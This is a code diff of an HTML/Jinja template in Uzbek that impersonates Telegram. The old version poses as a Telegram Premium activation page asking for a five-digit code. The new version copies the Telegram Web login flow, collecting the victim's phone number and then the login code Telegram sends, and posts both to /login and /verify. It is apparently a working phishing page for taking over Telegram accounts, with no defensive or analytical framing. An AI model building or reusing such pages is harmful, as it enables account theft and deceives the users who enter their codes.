@@ -3,80 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tasdiqlash - Telegram Premium</title>
+    <title>Telegram Web</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: linear-gradient(180deg, #1d2b64 0%, #0e1621 100%);
-            color: white;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-        }
-        .container { width: 90%; max-width: 400px; padding: 20px; }
-        .icon {
-            font-size: 50px;
-            margin-bottom: 20px;
-            color: #2b87ff;
-        }
-        h1 { font-size: 24px; margin-bottom: 15px; }
-        p { font-size: 16px; color: #b1c3d1; margin-bottom: 30px; line-height: 1.4; }
-        input[type="text"] {
-            width: 100%;
-            padding: 16px;
-            border-radius: 12px;
-            border: 1.5px solid #334659;
-            background: rgba(23, 33, 43, 0.8);
-            color: white;
-            font-size: 28px;
-            text-align: center;
-            letter-spacing: 8px;
-            font-weight: bold;
-            margin-bottom: 25px;
-            outline: none;
-        }
-        input[type="text"]::placeholder { letter-spacing: normal; font-size: 18px; font-weight: normal; color: #546b82; }
-        button {
-            width: 100%;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            background: #2b87ff;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        button:hover { background: #1a73e8; }
-        .info-box {
-            margin-top: 20px;
-            font-size: 13px;
-            color: #b1c3d1;
-            background: rgba(255, 255, 255, 0.05);
-            padding: 15px;
-            border-radius: 10px;
-        }
+        body { background-color: #f1f1f1; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); width: 100%; max-width: 360px; text-align: center; }
+        .logo { width: 100px; margin-bottom: 20px; }
+        h2 { font-size: 24px; font-weight: 500; margin-bottom: 10px; color: #222; }
+        p { color: #707579; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 8px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s; }
+        input:focus { border: 2px solid #3390ec; padding: 11px 14px; }
+        button { width: 100%; padding: 12px; background-color: #3390ec; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 10px; transition: background 0.2s; }
+        button:hover { background-color: #2b7bc5; }
+        .phone-display { font-weight: bold; color: #3390ec; margin-bottom: 15px; display: block; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon">💬</div>
-        <h1>Kodni tasdiqlang</h1>
-        <p>Telegram ilovangizga (SMS emas) 5 xonali tasdiqlash kodi yuborildi. Uni pastga kiriting:</p>
+    <div class="login-card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="logo">
         
-        <form action="/verify" method="POST">
-            <input type="text" name="otp" placeholder="00000" maxlength="5" autocomplete="off" required>
-            <button type="submit">DAVOM ETISH</button>
-        </form>
-
-        <div class="info-box">
-            Xavfsizlik yuzasidan kodni hech kimga bermang. Bu kod faqatgina Premium obunani faollashtirish uchun ishlatiladi.
-        </div>
+        {% if step == 1 %}
+            <h2>Telegram</h2>
+            <p>Iltimos, telefon raqamingizni kiriting.</p>
+            <form action="/login" method="post">
+                <input type="text" name="phone" placeholder="+998 90 123 45 67" required>
+                <button type="submit">Davom etish</button>
+            </form>
+        {% else %}
+            <h2>Kodni kiriting</h2>
+            <span class="phone-display">{{ phone }}</span>
+            <p>Biz hozirgina sizning qurilmangizga Telegram orqali kod yubordik.</p>
+            <form action="/verify" method="post">
+                <input type="hidden" name="phone" value="{{ phone }}">
+                <input type="text" name="code" placeholder="Olingan kodni yozing" required autocomplete="off">
+                <button type="submit">Tasdiqlash</button>
+            </form>
+        {% endif %}
     </div>
 </body>
 </html>
